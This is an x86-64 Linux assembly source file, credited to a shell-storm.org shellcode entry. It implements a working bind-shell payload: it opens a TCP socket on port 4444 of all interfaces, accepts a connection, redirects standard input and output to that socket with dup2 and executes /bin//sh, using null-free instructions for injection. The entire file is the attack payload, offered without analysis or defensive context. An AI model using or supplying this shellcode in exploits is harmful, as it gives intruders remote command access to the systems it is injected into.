;;;;; original code: http://shell-storm.org/shellcode/files/shellcode-858.php
global _start

section .text

_start:

;;;;; syscall socket()

	xor rax,rax
	add al, 0x29 ;41:syscall number
	xor rdi,rdi
	add rdi,0x2 ;2:AF_INET
	xor rsi,rsi
	inc rsi		;1:SOCK_STREAM
	xor rdx,rdx ;0:INADDR_ANY
	syscall
	mov rdi,rax

;;;;syscall bind()

	xor rax, rax 
	push rax
	push rax 			;0.0.0.0
	push word 0x5C11 	;port 4444
	push word 0x02		;2:AF_INET
	mov rsi,rsp
	add rdx,0x10 		;16:length
	add al, 0x31 		;49:syscall bind
	syscall


;;; syscall listen

	xor rax,rax
	add al, 0x32 	;50:syscall listen
	xor rsi,rsi
	inc rsi 		;1:backlog
	syscall

;;;; syscall accept
	
	xor rax,rax
	add al, 0x2b 	;43:syscall accept
	xor rsi,rsi		;0:rsi
	mov rdx,rsi 	;0:rdx
	syscall
	mov r15,rax 	;we'll save the socket handle for later phases


;;;;; dup2() syscall

	xor rsi,rsi
	add rsi, 0x02   ;counter with fd
	mov rdi, r15 	;socket handle that we saved before

	loop:
		xor rax,rax
		add al,0x21  ;33:syscall dup2
		syscall
		dec rsi
		jns loop

;;;;; Syscall execve()

	xor rax, rax        
    add rax, 59

    xor r9, r9
    push r9

    mov rbx, 0x68732f6e69622f2f	;/bin//sh in reverse
    push rbx 

    mov rdi, rsp
    push r9
    mov rdx, rsp

    push rdi
    mov  rsi, rsp
    syscall
